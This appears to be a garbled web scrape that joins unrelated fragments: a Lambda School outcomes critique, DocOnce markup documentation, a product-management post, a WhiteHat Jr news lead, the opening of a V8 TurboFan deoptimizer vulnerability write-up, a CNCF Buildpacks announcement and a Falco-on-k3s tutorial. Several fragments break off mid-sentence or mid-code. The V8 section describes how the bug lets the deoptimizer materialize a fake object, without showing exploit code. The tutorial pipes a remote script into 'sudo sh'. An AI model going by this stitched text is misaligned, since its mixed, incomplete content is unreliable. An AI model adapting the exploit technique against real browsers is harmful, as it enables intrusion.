<p>Still, why does any of this matter if Lambda is genuinely educating and helping students?</p>
<div><p>First of all, despite the outcomes report, we still have no idea what the median outcome actually is! They’re reporting data for 178 out of 448 enrolled students, which is just 40%. According to the report, the other 60% of enrolled students either:</p></div>
<ul>
<li>Remain unemployed (54 students, 12% of cohort)</li>
<li>Graduated late or not at all (164 students, 37%, of cohort)</li>
<li>Became mysteriously …</li></ul></div></div>

<h2>What Does DocOnce Look Like?<a href="#what-does-doconce-look-like" title="Permalink to this headline">¶</a></h2>
<p>DocOnce text looks like ordinary text (much like Markdown <a href="#markdown-input" id="id1">[1]</a>),
but there
are some almost invisible text constructions that allow you to control
the formating. Here are some examples.</p>
<blockquote>
<div><ul>
<li>Bullet lists automatically arise from lines starting with <code><span>*</span></code>,
or <code><span>o</span></code> if the list is to be enumerated.</li>
<li><em>Emphasized words</em> are surrounded by <code><span>*</span></code>. <strong>Words in boldface</strong>
are surrounded by underscores.</li>
<li>Words from computer code are enclosed in backticks and
then typeset <code><span>verbatim</span> <span>(in</span> <span>a</span> <span>monospace</span> <span>font)</span></code>.</li>
<li>Section headings are recognized by special
decorating characters <code><span>=</span></code> before and after the heading, e.g.,
<code><span>=====</span> <span>Here</span> <span>is</span> <span>a</span> <span>subsection</span> <span>heading</span> <span>=====</span></code>.</li>
<li>The abstract of a document starts with <em>Abstract</em> as paragraph
heading, and all text up to the next heading makes up the abstract,</li>
<li>Blocks of computer code are surrounded by
<code><span>!bc</span></code> (begin code) and <code><span>!ec</span></code> (end code) tags on separate lines.
Blocks of computer code can also be imported from source files.</li>
<li>Blocks of LaTeX mathematics are surrounded by
<code><span>!bt</span></code> (begin TeX) and <code><span>!et</span></code> (end TeX) tags on separate lines.
Inline mathematics is surrounded by dollar signs: <code><span>$a=b$</span></code>.</li>
<li>Comment lines start with <code><span>#</span></code> and are not visible in the output document.</li>
<li>Comments to authors can be inserted throughout the text with a
syntax like <code><span>[**name</span> <span>1**:</span> <span>comment...]</span></code> and made visible or invisible as desired.</li>
<li>Title, author, date, figures, and movies are written on one line,
starting with a keyword: <code><span>TITLE:</span></code>, <code><span>AUTHOR:</span></code>, <code><span>DATE:</span></code>, <code><span>FIGURE:</span></code>,
and <code><span>MOVIE:</span></code>.</li>
</ul>

<p>Write DocOnce documents in a text editor with monospace font</p>
<p>Some DocOnce constructions are sensitive to whitespace (indentation in
lists is a primary example), so you <em>must</em> use a text editor with
monospace font (also known as verbatim text). Never use fonts like
Arial or Helvetica.
Other popular markup languages such as Sphinx and Markdown are also
sensitive to whitespace and require a monospace font.</p>

<h3>What Can DocOnce Be Used For?<a href="#what-can-doconce-be-used-for" title="Permalink to this headline">¶</a></h3>
<p>LaTeX is ideal for articles, thesis, and books, but the PDF files does
not look fresh and modern on tablets and phones or big computer
screens. For the latter type of media you need HTML-based documents
with strong support for nice layouts. Tools like Sphinx, Markdown, or
plain HTML with Bootstrap are then more appropriate than LaTeX, but
involves a very different syntax.  DocOnce lets you write one text in
one place and then generate the most appropriate language for the
media you want to target.  DocOnce also has many extra features for
supporting large documents with much code and mathematics, not found
in any of other publishing tool.</p>

own favorite LaTeX packages. DocOnce is a much simpler format and
corresponds to writing in quite plain LaTeX and making the ascii text
look nice (be careful with the use of white space!). This means that
although DocOnce has borrowed a lot from LaTeX, there are a few points
LaTeX writers should pay attention to. Experience shows that these
points are so important that we list them <em>before</em> we list typical
DocOnce syntax!</p>
<p>Any LaTeX syntax in mathematical formulas is accepted when DocOnce
translates the text to LaTeX, but if output in the <code><span>sphinx</span></code>, <code><span>pandoc</span></code>,
<code><span>mwiki</span></code>, <code><span>html</span></code>, or <code><span>ipynb</span></code> formats is also important, one should
follow the rules below.</p>
<blockquote>
<div><ul>
<li>AMS LaTeX mathematics is supported, also for the <code><span>html</span></code>, <code><span>sphinx</span></code>,
and <code><span>ipynb</span></code> formats.</li>
<li>If you want LaTeX math blocks to work with <code><span>latex</span></code>, <code><span>html</span></code>, <code><span>sphinx</span></code>,
<code><span>markdown</span></code>, and <code><span>ipynb</span></code>, it is recommended to use only
the following equation environments: <code><span>\[</span> <span>...</span> <span>\]</span></code>,
<code><span>equation*</span></code>, <code><span>equation</span></code>, <code><span>align*</span></code>, <code><span>align</span></code>. <code><span>alignat*</span></code>, <code><span>alignat</span></code>.
Other environments, such as <code><span>split</span></code>, <code><span>multiline</span></code>, <code><span>gather</span></code> are
supported in modern MathJax in HTML and Sphinx, but may face
rendering problems (to a larger extent than <code><span>equation</span></code> and <code><span>align</span></code>).
DocOnce performs extensions to <code><span>sphinx</span></code>, <code><span>ipynb</span></code>,
and other formats such that
labels in <code><span>align</span></code> and <code><span>alignat</span></code> environments work well.
If you face problems with fancy LaTeX equation environments in
web formats, try rewriting with plain <code><span>align</span></code>, <code><span>nonumber</span></code>, etc.</li>
<li>Do not use comments inside equations.</li>
<li>Newcommands in mathematical formulas are allowed, but not in
the running text. Newcommands must be defined in files with names
<code><span>newcommands*.tex</span></code>. Use <code><span>\newcommands</span></code> and not <code><span>\def</span></code>.
Each newcommand must be defined on a single line.
Use Mako functions if you need macros in the running text.</li>
<li>Use labels and refer to them
for sections, figures, movies, and equations only.
MediaWiki (<code><span>mwiki</span></code>) does not support references to equations.</li>
<li>Spaces are not allowed in labels.</li>
<li>There is just one <code><span>ref</span></code> command (no <code><span>\eqref</span></code> for equations) and references to
equations must use parentheses. Never use the tilde ``&nbsp;`` (non-breaking
space) character before references to figures, sections, etc., but
tilde is allowed for references to equations.</li>
<li>Never use <code><span>\pageref</span></code> as pages are not a concept in web documents
(there is only a <code><span>ref</span></code> command in DocOnce and it refers to labels).</li>
<li>Only figures and movies are floating elements in DocOnce, all other elements
(code, tables, algorithms) must appear <em>inline</em> without numbers or labels
for reference <a href="#exception" id="id2">[2]</a> (refer to inline elements by a section label).
The reason is that floating elements are in general
not used in web documents, but we made an exception with figures
and movies.</li>
<li>Keep figure captions shorts as they are used as references in the
Sphinx format. Avoid inline mathematics since Sphinx will strip it
away in the figure reference.
(Many writing styles encourage rich captions that
explains everything about the figure, but this will work well
only in the HTML and LaTeX formats.)</li>
<li>You cannot use <code><span>subfigure</span></code> to combine several image files in one
figure, but you can combine the files to one file using
the <code><span>doconce</span> <span>combine_images</span></code> tool. Refer to individual image files
in the caption or text by (e.g.) “left” and “right”, or
“upper left”, “lower right”, etc.</li>
<li>Footnotes can be used as usual in LaTeX, but some HTML formats are not
able to display mathematics or inline verbatim or other formatted
code (emphasis, boldface, color) in footnotes - have that in mind.</li>
<li>Use plain <code><span>cite</span></code> for references (e.g., <code><span>\citeauthor</span></code> has no counterpart
in DocOnce). The bibliography must be prepared in the Publish format,
but import from (clean) BibTeX is possible.</li>
<li>Use <code><span>idx</span></code> for index entries, but put the definitions between paragraphs,
not inside them (required by Sphinx).</li>
<li>Use the <code><span>\bm</span></code> command (from the <code><span>bm</span></code> package, always included by DocOnce)
for boldface in mathematics.</li>
<li>Make sure all ordinary text starts in column 1 on each line. Equations
can be indented. The <code><span>\begin{}</span></code> and <code><span>\end{}</span></code> directives should start
in column 1.</li>
<li>If you depend on various LaTeX environments for your writings, you have
to give up these, or implement <em>user-defined environments</em> in DocOnce.
For instance, examples are normally typeset as subsections in DocOnce,
but can also utilize a user-defined example environment.
Learn about the exercise support in DocOnce for typesetting
exercises, problems, and projects.</li>
<li>Learn about the preprocessors Preprocess and Mako - these are smart
tools for, e.g., commenting out/in large portions of text and creating
macros.</li>
<li>Use <em>generalized referenes</em> when referring to companion documents
that may later become part of this document (or migrated out of this document).</li>
<li>Follow <a href="https://github.com/hplgit/setup4book-doconce">recommendations for DocOnce books</a> if you plan to write a book.</li>
</ul>
</div></blockquote>
<table id="exception">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#id2">[2]</a></td><td>There is an exception: by using <em>user-defined environments</em>
within <code><span>!bu-name</span></code> and <code><span>!eu-name</span></code> directives, it is possible to
label any type of text and refer to it. For example, one can have
environments for examples, tables, code snippets, theorems, lemmas, etc.
One can also use Mako functions to implement enviroments.</td></tr>
</tbody>
</table>
<div>
<p>Use the preprocessor to tailor output</p>
<p>If you really need special LaTeX constructs in the LaTeX output
from DocOnce, you may use use preprocessor if-tests on
the format (typically <code><span>#if</span> <span>FORMAT</span> <span>in</span> <span>("latex",</span> <span>"pdflatex")</span></code>) to
include such special LaTeX code. With an else clause you can easily
create corresponding constructions for other formats. This way
of using Preprocess or Mako
allows advanced LaTeX features, or HTML features for the HTML formats,
and thereby fine tuning of the resulting
document. More tuning can be done by automatic editing of the
output file (e.g., <code><span>.tex</span></code> or <code><span>.html</span></code>) produced by DocOnce using
your own scripts or the <code><span>doconce</span> <span>replace</span></code> and <code><span>doconce</span> <span>subst</span></code> commands.</p>
</div>
<div>
<p>Autotranslation of LaTeX to DocOnce</p>
<p>The tool <code><span>doconce</span> <span>latex2doconce</span></code> may help you translating LaTeX files
to DocOnce syntax. However, if you use computer code in floating
list environments, special packages for typesetting algorithms,
example environments, <code><span>subfigure</span></code> in figures,
or a lot of newcommands in the running text, there will be need for
a lot of manual edits and adjustments.</p>
<p>For examples, figure environments can be translated by the program
<code><span>doconce</span> <span>latex2doconce</span></code> only if the label is inside the caption and
the figure is typeset like</p>
<div><div><pre><span></span><span>\begin</span><span>{</span>figure<span>}</span>
  <span>\centering</span>
  <span>\includegraphics</span><span>[width=0.55\linewidth]</span><span>{</span>figs/myfig.pdf<span>}</span>
  <span>\caption</span><span>{</span>This is a figure. <span>\labe</span><span>{</span>myfig<span>}}</span>
<span>\end</span><span>{</span>figure<span>}</span>
</pre></div>
</div>
<p>If the LaTeX is consistent with respect to placement of the label, a
simple script can autoedit the label inside the caption, but many
LaTeX writers put the label at different places in different figures,
and then it becomes more difficult to autoedit figures and translate
them to the DocOnce <code><span>FIGURE:</span></code> syntax.</p>
<p>Tables are hard to interpret and translate, because the headings and
caption can be typeset in many different ways. The type of table
that is recognized looks like</p>
<div><div><pre><span></span><span>\begin</span><span>{</span>table<span>}</span>
<span>\caption</span><span>{</span>Here goes the caption.<span>}</span>
<span>\begin</span><span>{</span>tabular<span>}{</span>lr<span>}</span>
<span>\hline</span>
<span>\multicolumn</span><span>{</span>1<span>}{</span>c<span>}{</span><span>$</span><span>v_</span><span>0</span><span>$</span><span>}</span> <span>&amp;</span> <span>\multicolumn</span><span>{</span>1<span>}{</span>c<span>}{</span><span>$</span><span>f_R</span><span>(</span><span>v_</span><span>0</span><span>)</span><span>$</span><span>}</span><span>\\</span>
<span>\hline</span>
1.2 <span>&amp;</span> 4.2<span>\\</span>
1.1 <span>&amp;</span> 4.0<span>\\</span>
0.9 <span>&amp;</span> 3.7
<span>\hline</span>
<span>\end</span><span>{</span>tabular<span>}</span>
<span>\end</span><span>{</span>table<span>}</span>
</pre></div>
</div>
<p>Recall that table captions do not make sense in DocOnce since tables
must be inlined and explained in the surrounding text.</p>

<p>A few months ago, the company I co-founded&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://money.yahoo.com/oyster-acquires-carrom-accelerate-global-100000172.html">Carrom, was acquired by Oyster</a>. I joined Oyster to build the employment platform. It was officially my first time in a product role. Although I have been creating products for a good part of my life, I felt I lacked a lot of basic product management wisdom.</p>



<p>Over the past few months, I’ve been learning about the missing pieces with guidance from a few great mentors. I have curated a list of blog posts, books, and videos I’ve consumed along the way.</p>



<div><figure><img data-attachment-id="311" data-permalink="https://sooraj.io/screenshot-2020-11-18-at-20-36-01-1/" data-orig-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png" data-orig-size="1562,868" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-11-18-at-20.36.01-1" data-image-description="" data-medium-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=300" data-large-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=640" src="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=1024" alt="" srcset="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=1024 1024w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=150 150w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=300 300w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=768 768w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png 1562w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>







<p>The above is not an exhaustive list of things you have to learn. But this can help you get started.</p>



<p><strong>These are very superficial.</strong> It might also work for non-engineers. But I might have taken some things for granted that I already know. Hence the title Product Management for Engineers.</p>



<p>I will keep updating the list as I discover more quality content. You can follow me on&nbsp;<a target="_blank" href="https://twitter.com/soorajchandran_" rel="noreferrer noopener">Twitter</a>&nbsp;if you are interested.</p>

<p>Shaarif Ansari got the call on 11 November at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p>


<p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p>

                <h2 id="introduction">Introduction</h2>


<p>Late 2019, I presented at an internal Azimuth Security conference some work on hacking Chrome through it's JavaScript engine. </p>
<p>One of the topics I've been playing with at that time was deoptimization and so I discussed, among others, vulnerabilities in the deoptimizer. For my talk at <a href="https://www.infiltratecon.com/conference/briefings/attacking-chrome-in-2020-a-journey-through-v8s-optimizing-compiler.html">InfiltrateCon 2020</a> in Miami I was planning to discuss several components of V8. One of them was the deoptimizer. But as you all know, things didn't quite go as expected this year and the event has been postponed several times. </p>
<p>This blog post is actually an internal write-up I made for Azimuth Security a year ago and we decided to finally release it publicly.</p>
<p>Also, if you want to get serious about breaking browsers and feel like joining us, we're currently looking for experienced hackers (US/AU/UK/FR or anywhere else remotely). Feel free to reach out on <a href="https://twitter.com/__x86">twitter</a> or by <a href="mailto:jf@[company][dot]com">e-mail</a>.</p>
<p>Special thanks to the legendary <a href="https://twitter.com/mdowd">Mark Dowd</a> and <a href="https://twitter.com/hzon">John McDonald</a> for letting me publish this here.</p>


<p>For those unfamiliar with TurboFan, you may want to read an <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">Introduction to TurboFan</a> first. Also, <a href="https://benediktmeurer.de/publications/">Benedikt Meurer</a> gave a lot of very interesting talks that are strongly recommended to anyone interested in better understanding V8's internals.</p>

<h3 id="long-story-short">Long story short</h3>
<p>This vulnerability is a bug in the way the simplified lowering phase of TurboFan deals with <code>FrameState</code> and <code>StateValues</code> nodes. Those nodes are related to deoptimization. </p>
<p>During the code generation phase, using those nodes, TurboFan builds deoptimization input data that are used when the runtime bails out to the deoptimizer.</p>
<p>Because after a deoptimizaton execution goes from optimized native code back to interpreted bytecode, the deoptimizer needs to know where to deoptimize to (ex: which bytecode offset?) and how to build a correct frame (ex: what ignition registers?). To do that, the deoptimizer uses those deoptimization input data built during code generation.</p>
<p>Using this bug, it is possible to make code generation incorrectly build deoptimization input data so that the deoptimizer will materialize a fake object. Then, it redirects the execution to an ignition bytecode handler that has an arbitrary object pointer referenced by its accumulator register.</p>
<h2 id="internals">Internals</h2>
<p>To understand this bug, we want to know: </p>
<ul>
<li>what is ignition (because we deoptimize back to ignition)</li>
<li>what is simplified lowering (because that's where the bug is)</li>
<li>what is a deoptimization (because it is impacted by the bug and will materialize a fake object for us)</li>
</ul>
<h3 id="ignition">Ignition</h3>
<h4 id="overview">Overview</h4>
<p>V8 features an interpreter called Ignition. It uses TurboFan's macro-assembler. This assembler is architecture-independent and TurboFan is responsible for compiling these instructions down to the target architecture.</p>
<p>Ignition is a register machine. That means opcode's inputs and output are using only registers. There is an accumulator used as an implicit operand for many opcodes.</p>
<p>For every opcode, an associated handler is generated. Therefore, executing bytecode is mostly a matter of fetching the current opcode and dispatching it to the correct handler.</p>
<p>Let's observe the bytecode for a simple JavaScript function.</p>
<div><pre><span></span><code><span>let</span> <span>opt_me</span> <span>=</span> <span>(</span><span>o</span><span>,</span> <span>val</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>let</span> <span>value</span> <span>=</span> <span>val</span> <span>+</span> <span>42</span><span>;</span>
  <span>o</span><span>.</span><span>x</span> <span>=</span> <span>value</span><span>;</span>
<span>}</span>
<span>opt_me</span><span>({</span><span>x</span><span>:</span><span>1.1</span><span>});</span>
</code></pre></div>

<p>Using the <code>--print-bytecode</code> and <code>--print-bytecode-filter=opt_me</code> flags we can dump the corresponding generated bytecode.</p>
<div><pre><span></span><code>Parameter count 3

<p>Disassembling the function shows that the low level code is merely a trampoline to the interpreter entry point. In our case, running an x64 build, that means the trampoline jumps to the code generated by <code>Builtins::Generate_InterpreterEntryTrampoline</code> in <code>src/builtins/x64/builtins-x64.cc</code>.</p>
<div><pre><span></span><code>d8&gt; %DisassembleFunction(opt_me)

<p>This code simply fetches the instructions from the function's <code>BytecodeArray</code> and executes the corresponding ignition handler from a dispatch table.</p>

<p>Below is the part of <code>Builtins::Generate_InterpreterEntryTrampoline</code> that loads the address of the dispatch table into the <code>kInterpreterDispatchTableRegister</code>. Then it selects the current opcode using the <code>kInterpreterBytecodeOffsetRegister</code> and <code>kInterpreterBytecodeArrayRegister</code>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Today, the CNCF Technical Oversight Committee (TOC) voted to promote <a href="https://buildpacks.io/">Cloud Native Buildpacks</a> to incubation from the CNCF sandbox. Since joining CNCF in 2018, the Cloud Native Buildpacks project has added more than 15 new <a href="https://github.com/buildpacks/community/blob/master/ADOPTERS.md">production users</a>, new committers from more organizations, and defined an <a href="https://github.com/buildpacks/community/blob/main/GOVERNANCE.md">open governance process</a> and a clear <a href="https://github.com/buildpacks/community/blob/main/ROADMAP.md">project roadmap</a>.</p>



<p>The goal of the Cloud Native Buildpacks (CNB) project is to translate source code into container images with a focus on developer productivity, container security, and operations involving containerized applications at scale. The project also aims to unify the buildpack ecosystems of the past with a well-defined contract ideal for modern cloud native platforms.</p>



<p>“Cloud Native Buildpacks enable developers to work at whichever layer of abstraction is most productive for them while solving big problems like vulnerable dependencies and slow builds,” said Emily Casey, Buildpacks maintainer and staff engineer at VMware. “The project’s robust specification and tools have helped facilitate an ecosystem of composable buildpacks that interoperate with diverse platforms. We are excited to continue to grow the community as Buildpacks moves to incubation.”&nbsp;</p>



<p>“Heroku (Salesforce) open sourced the original Buildpacks project in 2012 with the hope that they would spread beyond the Heroku platform,” said Terence Lee, Buildpacks co-creator and principal engineer at Salesforce. “In 2018, Heroku and Pivotal (VMware) came together to start Cloud Native Buildpacks as a CNCF Sandbox project. With the move from the CNCF Sandbox to Incubation, Buildpacks are now fulfilling that vision while using OCI Image standards, increasing transparency, and building our community. We look forward to working with the community on new features and even more adoption.”&nbsp;</p>



<p>Cloud Native Buildpacks were accepted into the CNCF Sandbox in October 2018. Buildpacks are used in production by end user organizations, including Greenhouse, Salesforce, and VMware; in cloud native open source software <a href="https://github.com/cloudfoundry/cf-for-k8s/blob/master/README.md#purpose">Cloud Foundry on K8s</a>, <a href="https://github.com/GoogleContainerTools/skaffold/tree/master/examples/buildpacks">Google Skaffold</a>, <a href="https://www.hashicorp.com/blog/announcing-waypoint">Hashicorp Waypoint</a>, and <a href="https://github.com/pivotal/kpack">kpack</a>; and in commercial offerings including <a href="https://www.digitalocean.com/docs/app-platform/concepts/buildpack/">DigitalOcean App Platform,</a> <a href="https://cloud.google.com/blog/products/containers-kubernetes/google-cloud-now-supports-buildpacks">Google Cloud</a>, <a href="https://developer.salesforce.com/blogs/2019/11/introducing-salesforce-evergreen.html">Salesforce Evergreen</a>, and <a href="https://tanzu.vmware.com/build-service">VMware Tanzu Build Service</a>.</p>



<p>“HashiCorp Waypoint was built from day one with buildpacks in mind. We wanted a way for developers to go from code to deploy as quickly and easily as possible and Cloud Native Buildpacks provided the standard, technology, and community to achieve that goal,” says Mitchell Hashimoto, founder of HashiCorp “We look forward to continue investing in and improving our buildpack usage.”</p>



<p>“Developers shouldn’t have to think about how to package their applications for deployment, so I’m excited to see Cloud Native Buildpacks promoted to a CNCF incubation project,” said James Ward, developer advocate, Google Cloud. “At Google Cloud, we’ve open sourced our Buildpacks and added support for them into numerous products, including Cloud Build, Cloud Run, App Engine, Cloud Functions, Cloud Code, Cloud Shell, and Skaffold. Now going from source to running on the cloud is even easier.”&nbsp;</p>



<p><strong>Main Buildpacks Features:</strong></p>



<ul><li><strong>Specification</strong> – a formal-language <a href="https://github.com/buildpacks/spec">specification</a> that describes the platform-to-buildpack contract.</li><li><strong>Implementation</strong> –&nbsp; robust lifecycle tooling necessary for platforms to add support for building images using buildpacks.</li><li><strong>Platform</strong> – components that provide a developer experience directly to end users, including integrations with popular build tools and cloud platforms.&nbsp;</li></ul>



<p><strong>Notable Milestones:</strong></p>



<ul><li>6 maintainers from Salesforce and VMware</li><li>20 committers&nbsp;</li><li>More than 2k contributions</li><li>Almost&nbsp; 5k commits</li><li>Over 1,200k GitHub Stars</li><li>15 contributors</li></ul>



<p>The Cloud Native Buildpacks project is complementary to other CNCF projects, including Helm, Harbor, and Kubernetes. Cloud Native Buildpacks produce Open Container Initiative (OCI) images managed by Helm, stored in Harbor, and deployed to Kubernetes. The project’s overarching goal is to provide a reliable, safe, modular, and fast way to build OCI images from source or input artifacts.&nbsp;</p>



<p>“Cloud Native Buildpacks provide a reliable and seamless way to turn code into containers,” said Chris Aniszczyk, CTO of Cloud Native Computing Foundation and executive director of OCI. “This lowers the barrier for developers to take advantage of cloud native technology and improves the developer experience for a segment of developers and cloud native platforms.”</p>



<p>“Users need a simple way to package, provision, and manage cloud native applications. Buildpacks – originally used by Heroku or Cloud Foundry – have now gone fully cloud-native, embracing key patterns popularized by Kubernetes.” said Alexis Richardson, CEO Weaveworks and former CNCF TOC member, “Those are the same key patterns that are at the core of GitOps, and used in combination they provide Weaveworks customers the ability to upgrade and patch their application deployments.”</p>



<p>As a CNCF-hosted project, joining incubating technologies Argo, CloudEvents, CNI, Contour, Cortex, CRI-O, Dragonfly, etcd, Falco, gRPC, Linkerd, NATS, Notary, OPA, OpenTracing, Operator Framework, Rook, SPIFFE, SPIRE, Thanos, and KubeEdge, Cloud Native Buildpacks is part of a neutral foundation aligned with its technical interests, as well as the larger Linux Foundation, which provides governance, marketing support, and community outreach. For more information on maturity requirements for each level, please visit the <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">CNCF Graduation Criteria</a>.</p>

The maintainers will be hosting <a href="https://kccncna20.sched.com/event/focW?iframe=no">office hours</a> during <a href="https://events.linuxfoundation.org/kubecon-cloudnativecon-north-america/">KubeCon + CloudNativeCon North America Virtual 2020</a> to answer any questions about the project.

        <section>
            <div><p>Falco is an open source tool that peeks into the internals of your system to detect and report on syscall and network activity. It was originally built at <a href="https://sysdig.com/">Sysdig</a> and later donated to the <a href="https://www.cncf.io/">CNCF</a> where it's doing well as an Incubator project with an active community.</p>
<p>My understanding of Falco from <a href="https://twitter.com/lorisdegio">Sysdig's CTO</a> is that it's designed to be the last-line of defence in systems where the focus is usually put on preventative measures. Falco stands in to report on anomalies and unexpected behaviour.</p>
<p>When running <a href="https://k3s.io/">k3s</a> at an edge location, it may be difficult to gain physical access to servers, and there may be partial connectivity available.</p>

</blockquote>
<p>By default there are three possible event sources for Falco:</p>
<ul>
<li>The kernel and a number of syscalls</li>
<li><a href="https://ebpf.io/">eBPF</a> - faster than kernel access, but not available everywhere</li>
<li>Userland using <a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">PTRACE(2)</a> - for potential use with SaaS products like AWS Lambda</li>
</ul>
<p>These events can be sent to a webhook such as an <a href="https://www.openfaas.com/">OpenFaaS function</a> for remediation at the edge, or alerting and decision-making in a centralised action-centre in the cloud. As a generic event-sink, data can be ingested directly from the Kubernetes API, but a smart device such as a door-lock could also send data such as the current temperature, or unexpected motion picked up from an accelerometer.</p>

<p>Conceptual architecture: event detection from the Kernel, eBPF, the k3s API with alerting and remediation via <a href="https://www.openfaas.com/">OpenFaaS</a>.</p>
</blockquote>
<p>In this guide I'll show you how to configure Falco to run at the edge with k3s on an ARM64 host such as the <a href="https://amperecomputing.com/emag/">Ampere eMAG®</a> provided by <a href="https://blog.equinix.com/blog/2020/10/06/equinix-metal-metal-and-more/">Equinix Metal</a> (Equinix provide credits for open source projects hosted by the CNCF), an AWS Graviton instance, or a <a href="https://www.raspberrypi.org/products/raspberry-pi-4-model-b/">Raspberry Pi 4</a>.</p>
<h2 id="tutorial">Tutorial</h2>
<p>We'll start off by flashing Ubuntu Linux to the SD card, then adding k3s, finally we'll install Falco and configure k3s to send it events.</p>
<h3 id="downloadtheoperatingsystem">Download the Operating System</h3>
<p>You will need a Raspbery Pi 4. I am using a device with 4GB of RAM, but 2GB will also work.</p>
<p>Download the Ubuntu 20.04.01 image using the link for the Raspberry Pi 4.</p>
<p>You can get the image here: <a href="https://ubuntu.com/download/raspberry-pi">https://ubuntu.com/download/raspberry-pi</a></p>
<p>Now use <a href="https://etcher.io/">Etcher.io</a> or <code>dd</code> to write the server OS image to your Raspberry Pi's SD card.</p>
<h3 id="firstboot">First boot</h3>
<blockquote>
<p>Note: Unlike with RaspiOS, SSH is enabled by default.</p>
</blockquote>
<p>Boot up the machine and find it on your network using <code>nmap</code>:</p>
<pre><code>nmap -sP 192.168.0.0/24
</code></pre>
<p>Log in and change the password from <code>ubuntu</code> to whatever you like:</p>
<pre><code>ssh ubuntu@192.168.0.101
</code></pre>
<p>Next, copy over your SSH key:</p>
<pre><code>ssh-copy-id ubuntu@192.168.0.101
</code></pre>
<h3 id="preparefork3s">Prepare for k3s</h3>
<p>Edit <code>/firmware/boot/cmdline.txt</code> and add to the first line, don't add any line-breaks:</p>
<pre><code>cgroup_enable=cpuset cgroup_memory=1 cgroup_enable=memory
</code></pre>
<p>This enables cgroups which are required to set limits for containers. The step is taken from my tutorial for Raspbian: <a href="https://blog.alexellis.io/test-drive-k3s-on-raspberry-pi/">Will it cluster? k3s on your Raspberry Pi</a></p>
<p>Reboot your RPi:</p>
<pre><code>sudo reboot
</code></pre>
<h3 id="installk3swithk3sup">Install k3s with k3sup</h3>
<p>Use my k3sup tool to your workstation to install k3s over SSH. Do not run this on the RPi itself.</p>
<pre><code>curl -sLS https://get.k3sup.dev | sudo sh
</code></pre>
<p>Now install via <code>k3sup install</code>:</p>
<pre><code>k3sup install --ip 192.168.0.101 --user ubuntu \
  --channel latest
</code></pre>
<p>The <code>--channel</code> command installs Kubernetes 1.19.</p>
<h3 id="installfalcoanditsdependencies">Install Falco and its dependencies</h3>
<p>Log back into the RPi via SSH.</p>
<p>A fork of the upstream project is required to run on 64-bit ARM at present, but I expect these changes to be merged back in soon. A maintainer has provided a .deb file:</p>
<pre><code>sudo apt-get -y install linux-headers-$(uname -r) dkms
</code></pre>
<p>DKMS is required to build a Kernel module. This is one of the ways that Falco can instrument your system.</p>
<blockquote>
<p>You can also build from source using the <code>build/aarch64</code> branch.</p>
</blockquote>
<p>Install Falco's binary and let it build its kernel module:</p>
<pre><code>wget https://fs.fntlnz.wtf/falco/aarch64-builds/falco-0.26.1-48%2Bf82d905-aarch64.deb

sudo dpkg -i ./falco-0.26.1-48+f82d905-aarch64.deb
</code></pre>
<p>Silence some errors in the falco config file.</p>
<p>Edit <code>/etc/falco/falco.yaml</code> and replace the following:</p>
<pre><code>syscall_event_drops:
  actions:
    - log
    - alert
  rate: .03333
  max_burst: 10
</code></pre>
<p>With:</p>
<pre><code>syscall_event_drops:
  actions:
    - ignore
  rate: .03333
  max_burst: 10
</code></pre>
<p>This turns off some noise that I was seeing from the ARM-64 version.</p>
<p>Enable it upon boot-up:</p>
<pre><code>sudo systemctl enable falco \
  &amp;&amp; sudo systemctl start falco
</code></pre>
<p>You can find the various pre-loaded rules for falco at <code>/etc/falco/rules/</code></p>
<pre><code>ls /etc/falco/rules/

falco.yaml
falco_rules.local.yaml
falco_rules.yaml
k8s_audit_rules.yaml
</code></pre>
<h3 id="simulateafalcoevent">Simulate a Falco event</h3>
<p>Before configuring Kubernetes to send events to Falco, we can send a sample event that will trigger one of the built-in alerts.</p>
<pre><code>cat &gt;&gt; sample-event.json &lt;&lt;EOF
